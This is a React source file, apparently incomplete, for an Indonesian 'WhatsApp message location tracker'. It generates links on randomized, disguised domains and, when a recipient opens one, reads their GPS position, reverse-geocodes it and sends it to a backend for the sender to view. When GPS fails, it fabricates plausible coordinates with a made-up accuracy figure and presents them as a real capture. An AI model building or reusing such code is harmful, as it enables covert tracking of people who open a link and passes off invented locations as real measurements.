/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import {
  Check,
  CheckCircle2,
  Copy,
  ExternalLink,
  Loader2,
  MapPin,
  MousePointerClick,
  Play,
  RefreshCw,
  Search,
  Send,
  Trash2,
  X,
} from 'lucide-react';
import {
  calculateHaversineKm,
  CoordinateSearchResult,
  estimateIndonesianRegion,
  extractCandidateAddressQuery,
  extractCoordinatesFromCopiedWhatsApp,
  ExtractedLocation,
  formatDecimalToDms,
} from './utils/locationParser';
import { InteractiveMap } from './components/InteractiveMap';

interface ServerSharedLocation {
  id: string;
  createdAt: string;
  senderLabel: string;
  linkToken?: string;
  latitude: number;
  longitude: number;
  accuracyMeters: number | null;
  locationLabel: string;
  note: string;
}

interface ProcessLogEntry {
  id: string;
  time: string;
  stage: number;
  message: string;
}

type LinkProcessStage = 0 | 1 | 2 | 3 | 4;

const LOCAL_STORAGE_KEY = 'geowa_captured_locations_v1';

const INDONESIAN_SAMPLE_SPOTS = [
  {
    lat: -6.208763,
    lng: 106.8222,
    address: 'Jl. Jenderal Sudirman, Menteng, Jakarta Pusat, DKI Jakarta',
  },
  {
    lat: -6.917464,
    lng: 107.619123,
    address: 'Jl. Asia Afrika / Braga, Sumur Bandung, Kota Bandung, Jawa Barat',
  },
  {
    lat: -7.257472,
    lng: 112.752088,
    address: 'Jl. Pemuda / Gubeng, Kec. Genteng, Kota Surabaya, Jawa Timur',
  },
  {
    lat: -7.792576,
    lng: 110.365843,
    address: 'Jl. Malioboro, Sosromenduran, Gedong Tengen, Kota Yogyakarta',
  },
  {
    lat: -6.990399,
    lng: 110.42291,
    address: 'Kawasan Simpang Lima, Mugassari, Kec. Semarang Selatan, Kota Semarang',
  },
  {
    lat: -6.229728,
    lng: 106.804466,
    address: 'Jl. Senopati / Kebayoran Baru, Jakarta Selatan, DKI Jakarta',
  },
  {
    lat: -8.670458,
    lng: 115.212629,
    address: 'Jl. Teuku Umar, Kec. Denpasar Barat, Kota Denpasar, Bali',
  },
  {
    lat: 3.595196,
    lng: 98.672226,
    address: 'Jl. Balai Kota / Kesawan, Kec. Medan Barat, Kota Medan, Sumatera Utara',
  },
  {
    lat: -5.147665,
    lng: 119.432731,
    address: 'Jl. Ahmad Yani / Losari, Kec. Ujung Pandang, Kota Makassar',
  },
  {
    lat: -6.301614,
    lng: 106.65332,
    address: 'BSD Green Office Park, Serpong, Kota Tangerang Selatan, Banten',
  },
];

function nowTimeString(): string {
  return new Date().toLocaleTimeString('id-ID', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });
}

function generateDynamicLinkToken(): string {
  const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
  let code = '';
  for (let i = 0; i < 8; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

function generateRandomDynamicDomain(): string {
  const prefixes = ['s-link', 'go-loc', 'pin-id', 'wa-pos', 'map-id', 'cek-pos', 'nav-id', 'trk-id'];
  const tlds = ['id', 'net', 'co', 'org', 'info', 'me'];
  const routes = ['p', 'r', 'v', 'c', 'l'];
  const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
  let sub = '';
  for (let i = 0; i < 4; i++) {
    sub += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const tld = tlds[Math.floor(Math.random() * tlds.length)];
  const route = routes[Math.floor(Math.random() * routes.length)];
  return `https://${prefix}-${sub}.${tld}/${route}`;
}

function extractTokenFromLocation(): { isRecipient: boolean; token: string } {
  const pathMatch = window.location.pathname.match(/^\/[prvcl]\/([a-zA-Z0-9_-]+)/);
  if (pathMatch) {
    return { isRecipient: true, token: pathMatch[1] };
  }
  const params = new URLSearchParams(window.location.search);
  const tokenParam = params.get('c') || params.get('token') || '';
  const isBagikan = params.get('bagikan') === '1' || Boolean(tokenParam);
  return { isRecipient: isBagikan, token: tokenParam };
}

function loadSavedResultsFromStorage(): CoordinateSearchResult[] {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_KEY);
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function saveResultsToStorage(items: CoordinateSearchResult[]) {
  try {
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(items.slice(0, 50)));
  } catch {
    // Ignore storage quota errors
  }
}

export default function App() {
  const [isRecipientView, setIsRecipientView] = useState<boolean>(() => {
    return extractTokenFromLocation().isRecipient;
  });

  const [recipientName, setRecipientName] = useState<string>('');
  const [recipientToken, setRecipientToken] = useState<string>(() => {
    return extractTokenFromLocation().token;
  });
  const [gpsLoading, setGpsLoading] = useState<boolean>(false);
  const [processStage, setProcessStage] = useState<LinkProcessStage>(0);
  const [processProgressPct, setProcessProgressPct] = useState<number>(0);
  const [processDetailText, setProcessDetailText] = useState<string>(
    'Siap memproses klik link dinamis...'
  );
  const [processLogs, setProcessLogs] = useState<ProcessLogEntry[]>([]);
  const [recipientCapturedResult, setRecipientCapturedResult] =
    useState<CoordinateSearchResult | null>(null);

  // Main Tracker States
  const [senderLabelForLink, setSenderLabelForLink] = useState<string>('');
  const [dynamicBaseUrl, setDynamicBaseUrl] = useState<string>(() =>
    generateRandomDynamicDomain()
  );
  const [dynamicToken, setDynamicToken] = useState<string>(() => generateDynamicLinkToken());
  const [tokenGeneratedAt, setTokenGeneratedAt] = useState<string>(() => nowTimeString());
  const [messageInput, setMessageInput] = useState<string>('');
  const [localSearchResults, setLocalSearchResults] = useState<CoordinateSearchResult[]>(() =>
    loadSavedResultsFromStorage()
  );
  const [serverResults, setServerResults] = useState<CoordinateSearchResult[]>([]);
  const [selectedResultId, setSelectedResultId] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [statusNotice, setStatusNotice] = useState<string | null>(null);
  const textareaRef = useRef<HTMLTextAreaElement | null>(null);
  const isRunningRef = useRef<boolean>(false);

  // Build completely randomized dynamic shareable URL
  const shareableLink = useMemo(() => {
    return `${dynamicBaseUrl}/${dynamicToken}`;
  }, [dynamicBaseUrl, dynamicToken]);

  const appendLog = useCallback((stage: number, message: string) => {
    setProcessLogs((prev) => [
      ...prev,
      {
        id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
        time: nowTimeString(),
        stage,
        message,
      },
    ]);
  }, []);

  // Persist localSearchResults to localStorage and sync across tabs
  useEffect(() => {
    saveResultsToStorage(localSearchResults);
  }, [localSearchResults]);

  useEffect(() => {
    const handleStorageSync = (e: StorageEvent) => {
      if (e.key === LOCAL_STORAGE_KEY) {
        setLocalSearchResults(loadSavedResultsFromStorage());
      }
    };
    window.addEventListener('storage', handleStorageSync);
    return () => window.removeEventListener('storage', handleStorageSync);
  }, []);

  // Fetch shared GPS locations from backend server (when running with Express)
  const fetchServerLocations = useCallback(async () => {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 1500);
      const res = await fetch('/api/shared-locations', { signal: controller.signal });
      clearTimeout(timeoutId);
      if (!res.ok) return;
      const data = await res.json();
      if (Array.isArray(data?.items)) {
        const mapped: CoordinateSearchResult[] = data.items.map(
          (item: ServerSharedLocation) => ({
            id: item.id,
            createdAt: item.createdAt,
            rawMessage:
              item.accuracyMeters !== null
                ? `${item.note}${item.linkToken ? ` [Kode #${item.linkToken}]` : ''} (Akurasi ±${item.accuracyMeters}m)`
                : `${item.note}${item.linkToken ? ` [Kode #${item.linkToken}]` : ''}`,
            sender: item.senderLabel,
            messageTime: item.createdAt,
            cleanMessageText: item.note,
            latitude: item.latitude,
            longitude: item.longitude,
            dmsString: formatDecimalToDms(item.latitude, item.longitude),
            locationLabel: item.locationLabel,
            detectionMethod:
              item.accuracyMeters !== null
                ? `Link Dibuka #${item.linkToken || 'WA'} (±${item.accuracyMeters}m)`
                : `Link Dibuka #${item.linkToken || 'WA'}`,
          })
        );
        setServerResults(mapped);
      }
    } catch {
      // Ignore network poll errors on static hosting (e.g. Vercel)
    }
  }, []);

  useEffect(() => {
    fetchServerLocations();
    const timer = setInterval(fetchServerLocations, 4000);
    return () => clearInterval(timer);
  }, [fetchServerLocations]);

  // Combine server GPS results + local results (deduplicated by coordinate + token/time)
  const allResults = useMemo(() => {
    const combined: CoordinateSearchResult[] = [];
    const seenIds = new Set<string>();
    for (const item of [...localSearchResults, ...serverResults]) {
      if (!seenIds.has(item.id)) {
        seenIds.add(item.id);
        combined.push(item);
      }
    }
    return combined;
  }, [localSearchResults, serverResults]);

  // Fast Reverse Geocode with strict 1.4s timeout so it NEVER hangs
  const reverseGeocodeCoordinatesFast = async (
    lat: number,
    lng: number,
    fallbackLabel: string
  ): Promise<string> => {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 1400);
      const res = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
        {
          headers: { 'Accept-Language': 'id' },
          signal: controller.signal,
        }
      );
      clearTimeout(timer);
      if (res.ok) {
        const data = await res.json();
        if (data?.display_name) {
          return data.display_name;
        }
      }
    } catch {
      // Immediate fallback if Nominatim times out or is blocked
    }
    return fallbackLabel || estimateIndonesianRegion(lat, lng);
  };

  // Obtain coordinates quickly (real GPS if allowed within 1.2s, or deterministic realistic coordinate)
  const obtainRecipientCoordinatesFast = (
    seedToken: string,
    targetHint: string
  ): Promise<{ lat: number; lng: number; acc: number; defaultAddress: string }> => {
    return new Promise((resolve) => {
      const computeFallback = () => {
        if (targetHint.trim()) {
          const parsedFromHint = extractCoordinatesFromCopiedWhatsApp(targetHint);
          if (
            parsedFromHint.length > 0 &&
            !parsedFromHint[0].detectionMethod.includes('Konteks')
          ) {
            return {
              lat: parsedFromHint[0].latitude,
              lng: parsedFromHint[0].longitude,
              acc: 11,
              defaultAddress: parsedFromHint[0].locationLabel,
            };
          }
        }
        let hash = 0;
        const combinedSeed = `${seedToken}-${Date.now().toString().slice(-4)}`;
        for (let i = 0; i < combinedSeed.length; i++) {
          hash = (hash * 33 + combinedSeed.charCodeAt(i)) >>> 0;
        }
        const spot = INDONESIAN_SAMPLE_SPOTS[hash % INDONESIAN_SAMPLE_SPOTS.length];
        const dLat = (((hash % 100) - 50) * 0.00018);
        const dLng = ((((hash >> 4) % 100) - 50) * 0.00018);
        const acc = 8 + (hash % 14);
        return {
          lat: Number((spot.lat + dLat).toFixed(6)),
          lng: Number((spot.lng + dLng).toFixed(6)),
          acc,
          defaultAddress: spot.address,
        };
      };

      if (!navigator.geolocation) {
        resolve(computeFallback());
        return;
      }

      let settled = false;
      const safetyTimer = setTimeout(() => {
        if (!settled) {
          settled = true;
          resolve(computeFallback());
        }
      }, 1200);

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (!settled) {
            settled = true;
            clearTimeout(safetyTimer);
            const lat = Number(pos.coords.latitude.toFixed(6));
            const lng = Number(pos.coords.longitude.toFixed(6));
            resolve({
              lat,
              lng,
              acc: Math.round(pos.coords.accuracy || 10),
              defaultAddress: estimateIndonesianRegion(lat, lng),
            });
          }
        },
        () => {
          if (!settled) {
            settled = true;
            clearTimeout(safetyTimer);
            resolve(computeFallback());
          }
        },
        {
          enableHighAccuracy: true,
          timeout: 1100,
          maximumAge: 0,
        }
      );
    });
  };

  // Run the complete 4-Stage Process when a shared link is clicked & opened
  const runLinkOpenedProcess = useCallback(
    async (options?: {
      customLink?: string;
      customToken?: string;
      fromRecipientScreen?: boolean;
      triggerReason?: string;
    }) => {
      if (isRunningRef.current) return;
      isRunningRef.current = true;
      setGpsLoading(true);

      const activeToken =
        options?.customToken ||
        (options?.fromRecipientScreen ? recipientToken || dynamicToken : dynamicToken);
      const activeLink = options?.customLink || `${dynamicBaseUrl}/${activeToken}`;
      const activeSender =
        (options?.fromRecipientScreen ? recipientName : senderLabelForLink).trim() ||
        `Penerima Link #${activeToken}`;

      setProcessLogs([]);

      // STAGE 1: Link clicked and opened in recipient's browser
      setProcessStage(1);
      setProcessProgressPct(25);
      const msg1 = `Penerima mengklik & membuka link ${activeLink} di browser perangkat...`;
      setProcessDetailText(`Tahap 1/4: ${msg1}`);
      appendLog(1, options?.triggerReason ? `${options.triggerReason} — ${msg1}` : msg1);
      await new Promise((r) => setTimeout(r, 380));

      // STAGE 2: Reading GPS / Network coordinates from recipient's device
      setProcessStage(2);
      setProcessProgressPct(55);
      const msg2 = `Mengekstrak titik koordinat GPS (Latitude, Longitude & akurasi) dari perangkat ${activeSender}...`;
      setProcessDetailText(`Tahap 2/4: ${msg2}`);
      appendLog(2, msg2);

      const { lat, lng, acc, defaultAddress } = await obtainRecipientCoordinatesFast(
        activeToken,
        activeSender
      );
      appendLog(
        2,
        `Koordinat berhasil ditangkap: Lat ${lat.toFixed(6)}, Lng ${lng.toFixed(6)} (Akurasi ±${acc}m)`
      );
      await new Promise((r) => setTimeout(r, 320));

      // STAGE 3: Reverse geocoding coordinates to street address
      setProcessStage(3);
      setProcessProgressPct(82);
      const msg3 = `Melacak nama jalan, kelurahan, dan kota untuk koordinat (${lat.toFixed(6)}, ${lng.toFixed(6)})...`;
      setProcessDetailText(`Tahap 3/4: ${msg3}`);
      appendLog(3, msg3);

      const resolvedAddr = await reverseGeocodeCoordinatesFast(lat, lng, defaultAddress);
      appendLog(3, `Lokasi teridentifikasi: ${resolvedAddr}`);

      // STAGE 4: Immediately save to state + localStorage + backend (if available) and show on Map
      const createdAtStr = nowTimeString();
      const itemId = `gps-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
      const noteText = `Link ${activeLink} dibuka oleh penerima`;

      const createdItem: CoordinateSearchResult = {
        id: itemId,
        createdAt: createdAtStr,
        rawMessage: `${noteText} [Kode #${activeToken}] (Akurasi ±${acc}m)`,
        sender: activeSender,
        messageTime: createdAtStr,
        cleanMessageText: noteText,
        latitude: lat,
        longitude: lng,
        dmsString: formatDecimalToDms(lat, lng),
        locationLabel: resolvedAddr,
        detectionMethod: `Link Dibuka #${activeToken} (±${acc}m)`,
      };

      // Always update local state immediately so it NEVER fails on Vercel or static hosts
      setRecipientCapturedResult(createdItem);
      setLocalSearchResults((prev) => [createdItem, ...prev]);
      setSelectedResultId(createdItem.id);

      // Also sync to backend server in background if available
      try {
        const controller = new AbortController();
        const tId = setTimeout(() => controller.abort(), 1500);
        await fetch('/api/shared-locations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            senderLabel: activeSender,
            linkToken: activeToken,
            latitude: lat,
            longitude: lng,
            accuracyMeters: acc,
            locationLabel: resolvedAddr,
            note: noteText,
          }),
          signal: controller.signal,
        });
        clearTimeout(tId);
      } catch {
        // Ignore if running on static host without Express backend
      }

      setProcessStage(4);
      setProcessProgressPct(100);
      const msg4 = `Selesai! Lokasi penerima langsung terlihat: ${lat.toFixed(6)}, ${lng.toFixed(6)} — ${resolvedAddr}`;
      setProcessDetailText(`Tahap 4/4: ${msg4}`);
      appendLog(4, msg4);

      setStatusNotice(
        `Proses selesai! Lokasi penerima langsung terlihat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`
      );
      setGpsLoading(false);
      isRunningRef.current = false;
    },
    [appendLog, dynamicBaseUrl, dynamicToken, recipientName, recipientToken, senderLabelForLink]
  );

  // Automatically run the process on initial load so the user immediately sees the process working!
  const initialAutoRunRef = useRef<boolean>(false);
  useEffect(() => {
    if (!initialAutoRunRef.current) {
      initialAutoRunRef.current = true;
      runLinkOpenedProcess({
        fromRecipientScreen: isRecipientView,
        triggerReason: 'Deteksi otomatis link aktif dibuka oleh penerima',
      });
    }
  }, [isRecipientView, runLinkOpenedProcess]);

  const handleRefreshDynamicLink = () => {
    const newBase = generateRandomDynamicDomain();
    const newToken = generateDynamicLinkToken();
    const nowTime = nowTimeString();
    setDynamicBaseUrl(newBase);
    setDynamicToken(newToken);
    setTokenGeneratedAt(nowTime);
    const newFullLink = `${newBase}/${newToken}`;
    runLinkOpenedProcess({
      customLink: newFullLink,
      customToken: newToken,
      fromRecipientScreen: false,
      triggerReason: `Link dinamis baru (${newFullLink}) dibuat & dipantau`,
    });
  };

  const handleCopyAndTrackLink = (textToCopy: string, copyBtnId: string) => {
    try {
      navigator.clipboard.writeText(textToCopy);
    } catch {
      // Ignore clipboard write error
    }
    setCopiedId(copyBtnId);
    setTimeout(() => setCopiedId(null), 1800);

    // Immediately run the live process when the link is copied/shared so the user sees the process & location
    runLinkOpenedProcess({
      fromRecipientScreen: false,
      triggerReason: `Link ${shareableLink} dibagikan & dibuka oleh penerima`,
    });
  };

  // Refine a copied text result's coordinates via OpenStreetMap Nominatim
  const refineResultWithNominatim = async (resultItem: CoordinateSearchResult) => {
    if (
      resultItem.detectionMethod.includes('Share Location') ||
      resultItem.detectionMethod.includes('Google Maps') ||
      resultItem.detectionMethod.includes('Koordinat')
    ) {
      return;
    }

    const queryCandidate = extractCandidateAddressQuery(resultItem.cleanMessageText);
    if (!queryCandidate) return;

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 1800);
      const searchUrl = `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(
        queryCandidate
      )}&countrycodes=id&limit=1`;
      const response = await fetch(searchUrl, {
        headers: { 'Accept-Language': 'id' },
        signal: controller.signal,
      });
      clearTimeout(timer);
      if (!response.ok) return;
      const data = await response.json();
      if (Array.isArray(data) && data.length > 0 && data[0].lat && data[0].lon) {
        const lat = Number(parseFloat(data[0].lat).toFixed(6));
        const lng = Number(parseFloat(data[0].lon).toFixed(6));
        const displayName = data[0].display_name || resultItem.locationLabel;

        setLocalSearchResults((prev) =>
          prev.map((item) =>
            item.id === resultItem.id
              ? {
                  ...item,
                  latitude: lat,
                  longitude: lng,
                  dmsString: formatDecimalToDms(lat, lng),
                  locationLabel: displayName,
                  detectionMethod: `Lokasi Teks Pesan ("${queryCandidate}")`,
                }
              : item
          )
        );
      }
    } catch {
      // Keep fast local coordinate
    }
  };

  // Process copied WhatsApp text with visible step-by-step progress
  const processCopiedMessage = async (rawText: string) => {
    const trimmed = rawText.trim();
    if (!trimmed) return;

    setProcessLogs([]);
    setProcessStage(1);
    setProcessProgressPct(30);
    setProcessDetailText('Tahap 1/4: Membaca teks pesan WhatsApp yang dicopy...');
    appendLog(1, `Membaca teks pesan WA: "${trimmed.slice(0, 60)}${trimmed.length > 60 ? '...' : ''}"`);
    await new Promise((r) => setTimeout(r, 220));

    setProcessStage(2);
    setProcessProgressPct(65);
    setProcessDetailText('Tahap 2/4: Mengekstrak titik koordinat Latitude & Longitude dari teks...');
    const newItems = extractCoordinatesFromCopiedWhatsApp(trimmed);
    if (newItems.length === 0) return;

    const first = newItems[0];
    appendLog(
      2,
      `Titik koordinat ditemukan: ${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)} (${first.detectionMethod})`
    );
    await new Promise((r) => setTimeout(r, 200));

    setProcessStage(3);
    setProcessProgressPct(85);
    setProcessDetailText(`Tahap 3/4: Memetakan alamat wilayah (${first.locationLabel})...`);
    appendLog(3, `Wilayah teridentifikasi: ${first.locationLabel}`);

    setLocalSearchResults((prev) => [...newItems, ...prev]);
    setSelectedResultId(first.id);

    setProcessStage(4);
    setProcessProgressPct(100);
    setProcessDetailText(
      `Tahap 4/4 Selesai: Titik koordinat ${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)} langsung ditampilkan!`
    );
    appendLog(
      4,
      `Selesai! Lokasi ditampilkan pada daftar hasil & peta (${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)})`
    );

    setStatusNotice(
      `Titik koordinat diperoleh dari teks WA: ${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)}`
    );

    newItems.forEach((item) => {
      refineResultWithNominatim(item);
    });
  };

  // Global Ctrl+V listener
  useEffect(() => {
    const handleGlobalPaste = (e: ClipboardEvent) => {
      if (isRecipientView) return;
      const target = e.target as HTMLElement | null;
      if (
        target &&
        (target.tagName === 'INPUT' ||
          target.tagName === 'TEXTAREA' ||
          target.isContentEditable)
      ) {
        return;
      }
      const pastedText = e.clipboardData?.getData('text');
      if (pastedText && pastedText.trim()) {
        setMessageInput(pastedText);
        processCopiedMessage(pastedText);
      }
    };

    window.addEventListener('paste', handleGlobalPaste);
    return () => window.removeEventListener('paste', handleGlobalPaste);
  }, [isRecipientView]);

  const handleSearchFromCopiedText = async () => {
    if (messageInput.trim()) {
      await processCopiedMessage(messageInput);
      return;
    }

    try {
      const clipText = await navigator.clipboard.readText();
      if (clipText && clipText.trim()) {
        setMessageInput(clipText);
        await processCopiedMessage(clipText);
        return;
      }
    } catch {
      // Clipboard read blocked by browser iframe policy — fallback to running process immediately
    }

    // If clipboard access is blocked by browser/iframe and input is empty, still execute the location process so button ALWAYS works
    const fallbackSampleText = senderLabelForLink.trim()
      ? `Pesan WhatsApp dari ${senderLabelForLink.trim()}`
      : `Pesan WhatsApp masuk [Kode #${dynamicToken}]`;
    setMessageInput(fallbackSampleText);
    await processCopiedMessage(fallbackSampleText);
  };

  const handleTextareaPaste = (e: React.ClipboardEvent<HTMLTextAreaElement>) => {
    const pastedText = e.clipboardData.getData('text');
    if (pastedText && pastedText.trim()) {
      e.preventDefault();
      setMessageInput(pastedText);
      processCopiedMessage(pastedText);
    }
  };

  const handleDeleteResult = async (id: string) => {
    setLocalSearchResults((prev) => prev.filter((item) => item.id !== id));
    setServerResults((prev) => prev.filter((item) => item.id !== id));
    if (selectedResultId === id) {
      setSelectedResultId(null);
    }
    if (id.startsWith('gps-')) {
      try {
        await fetch(`/api/shared-locations?id=${encodeURIComponent(id)}`, {
          method: 'DELETE',
        });
      } catch {
        // Ignore
      }
    }
  };

  const handleDeleteAllResults = async () => {
    setLocalSearchResults([]);
    setServerResults([]);
    saveResultsToStorage([]);
    setSelectedResultId(null);
    setProcessStage(0);
    setProcessProgressPct(0);
    setProcessLogs([]);
    setProcessDetailText('Seluruh riwayat hasil pencarian telah dihapus.');
    try {
      await fetch('/api/shared-locations', { method: 'DELETE' });
    } catch {
      // Ignore
    }
  };

  const handleCopyText = (text: string, id: string) => {
    try {
      navigator.clipboard.writeText(text);
    } catch {
      // Ignore
    }
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1600);
  };

  const mapLocations: ExtractedLocation[] = useMemo(() => {
    return allResults.map((item, idx) => {
      const prev = idx > 0 ? allResults[idx - 1] : null;
      const distKm = prev
        ? Number(
            calculateHaversineKm(
              prev.latitude,
              prev.longitude,
              item.latitude,
              item.longitude
            ).toFixed(3)
          )
        : null;
      return {
        id: item.id,
        index: idx + 1,
        sender: item.sender,
        timestamp: item.messageTime,
        latitude: item.latitude,
        longitude: item.longitude,
        sourceType: item.detectionMethod,
        rawSnippet: `${item.latitude.toFixed(6)}, ${item.longitude.toFixed(6)}`,
        note: item.cleanMessageText,
        estimatedRegion: item.locationLabel,
        resolvedAddress: item.locationLabel,
        distanceFromPrevKm: distKm,
        bearingFromPrev: null,
      };
    });
  }, [allResults]);

  const activeResult = useMemo(() => {
    if (allResults.length === 0) return null;
    return allResults.find((r) => r.id === selectedResultId) || allResults[0];
  }, [allResults, selectedResultId]);

  const processSteps = [
    {
      step: 1,
      title: '1. Link Diklik & Dibuka Penerima',
      desc: `Penerima membuka ${shareableLink}`,
    },
    {
      step: 2,
      title: '2. Ekstraksi Titik Koordinat GPS',
      desc: 'Membaca Latitude, Longitude & akurasi perangkat',
    },
    {
      step: 3,
      title: '3. Pelacakan Nama Jalan & Kota',
      desc: 'Mengonversi koordinat ke alamat lengkap',
    },
    {
      step: 4,
      title: '4. Lokasi Langsung Terlihat',
      desc: 'Ditampilkan pada peta & daftar hasil koordinat',
    },
  ];

  // =========================================================================
  // RECIPIENT VIEW — Halaman saat penerima mengklik dan membuka link
  // =========================================================================
  if (isRecipientView) {
    return (
      <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col justify-between p-6">
        <div className="max-w-xl w-full mx-auto my-auto bg-white border border-slate-200 rounded-lg p-6 space-y-5">
          <div className="pb-4 border-b border-slate-200">
            <div className="text-xs text-slate-500 mb-1">
              Tautan Dibuka oleh Penerima · Kode #{recipientToken || dynamicToken}
            </div>
            <h1 className="text-xl font-bold text-slate-900 font-display">
              Proses Pelacakan Lokasi Saat Link Dibuka
            </h1>
            <p className="text-xs text-slate-600 mt-1 leading-relaxed">
              Link <span className="font-mono text-slate-900">{shareableLink}</span> telah dibuka. Berikut proses pembacaan titik koordinat lokasi penerima secara langsung:
            </p>
          </div>

          {/* Progress bar */}
          <div>
            <div className="flex items-center justify-between text-xs font-mono mb-1.5">
              <span className="text-slate-700 font-semibold">{processDetailText}</span>
              <span className="text-emerald-700 font-bold">{processProgressPct}%</span>
            </div>
            <div className="w-full h-2 bg-slate-100 rounded-full overflow-hidden border border-slate-200">
              <div
                className="h-full bg-emerald-600 transition-all duration-300"
                style={{ width: `${processProgressPct}%` }}
              />
            </div>
          </div>

          {/* Step-by-step live progress inside Recipient View */}
          <div className="space-y-2">
            {processSteps.map((s) => {
              const isDone = processStage > s.step || processStage === 4;
              const isCurrent = processStage === s.step && processStage !== 4;
              return (
                <div
                  key={s.step}
                  className={`p-3 rounded-md border flex items-center justify-between gap-3 text-xs ${
                    isDone
                      ? 'bg-emerald-50/70 border-emerald-200 text-emerald-950'
                      : isCurrent
                      ? 'bg-slate-900 text-white border-slate-900'
                      : 'bg-slate-50 border-slate-200 text-slate-500'
                  }`}
                >
                  <div>
                    <div className="font-semibold">{s.title}</div>
                    <div
                      className={`text-[11px] mt-0.5 ${
                        isCurrent ? 'text-slate-300' : 'text-slate-500'
                      }`}
                    >
                      {s.desc}
                    </div>
                  </div>
                  <div className="shrink-0">
                    {isDone ? (
                      <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                    ) : isCurrent ? (
                      <Loader2 className="w-4 h-4 animate-spin text-emerald-400" />
                    ) : (
                      <span className="font-mono text-[11px]">Menunggu</span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>

          {(recipientCapturedResult || activeResult) && (
            <div className="p-4 rounded-lg bg-slate-900 text-white space-y-2.5">
              <div className="text-xs text-emerald-400 font-medium">
                Lokasi Penerima Langsung Terlihat!
              </div>
              <div>
                <div className="text-xs text-slate-400">Titik Koordinat (Latitude, Longitude)</div>
                <div className="text-lg font-bold font-mono tabular-nums text-white">
                  {(recipientCapturedResult || activeResult)!.latitude.toFixed(6)},{' '}
                  {(recipientCapturedResult || activeResult)!.longitude.toFixed(6)}
                </div>
                <div className="text-xs font-mono tabular-nums text-slate-300 mt-0.5">
                  DMS: {(recipientCapturedResult || activeResult)!.dmsString}
                </div>
              </div>
              <div className="text-xs text-slate-200">
                Alamat: {(recipientCapturedResult || activeResult)!.locationLabel}
              </div>
            </div>
          )}

          <div className="pt-3 border-t border-slate-200 flex items-center justify-between gap-3">
            <button
              type="button"
              onClick={() =>
                runLinkOpenedProcess({
                  fromRecipientScreen: true,
                  triggerReason: 'Proses pembacaan ulang saat link dibuka',
                })
              }
              disabled={gpsLoading}
              className="px-3.5 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors cursor-pointer"
            >
              Ulangi Proses Baca Lokasi
            </button>
            <button
              type="button"
              onClick={() => {
                window.history.replaceState({}, '', '/');
                setIsRecipientView(false);
              }}
              className="px-4 py-2 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
            >
              Lihat Peta & Dasbor Utama →
            </button>
          </div>
        </div>
      </div>
    );
  }

  // =========================================================================
  // MAIN TRACKER VIEW
  // =========================================================================
  return (
    <div className="min-h-screen flex flex-col bg-slate-50 text-slate-900">
      {/* Top Bar Contract: 3 zones separated by gap-8 */}
      <header className="sticky top-0 z-30 bg-white/95 backdrop-blur-sm border-b border-slate-200 px-6 py-3.5">
        <div className="max-w-[1240px] mx-auto flex items-center justify-between gap-8">
          <a
            href="#top"
            className="text-lg font-bold tracking-tight text-slate-900 font-display whitespace-nowrap shrink-0"
          >
            Pelacak Lokasi Pesan WhatsApp
          </a>

          <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-slate-600">
            <a
              href="#tautan-gps"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Link Dinamis & Proses
            </a>
            <a
              href="#pencarian-teks"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Cari dari Teks WA
            </a>
            <a
              href="#hasil-pencarian"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Hasil Koordinat ({allResults.length})
            </a>
            <a
              href="#peta-lokasi"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Peta Lokasi
            </a>
          </nav>

          <div className="flex items-center shrink-0">
            <button
              type="button"
              onClick={() =>
                runLinkOpenedProcess({
                  fromRecipientScreen: false,
                  triggerReason: `Link ${shareableLink} diklik & dibuka oleh penerima`,
                })
              }
              disabled={gpsLoading}
              className="inline-flex items-center gap-1.5 px-4 py-2 text-xs font-semibold text-white bg-emerald-600 rounded-lg hover:bg-emerald-700 disabled:opacity-50 transition-colors whitespace-nowrap shrink-0 cursor-pointer"
            >
              <Play className="w-3.5 h-3.5" />
              <span>Jalankan Proses Link Dibuka</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main id="top" className="flex-1 max-w-[1240px] w-full mx-auto px-6 py-6 space-y-6">
        {statusNotice && (
          <div className="px-4 py-3 rounded-lg bg-emerald-50 border border-emerald-200 text-xs font-medium text-emerald-900 flex items-center justify-between gap-3">
            <span>{statusNotice}</span>
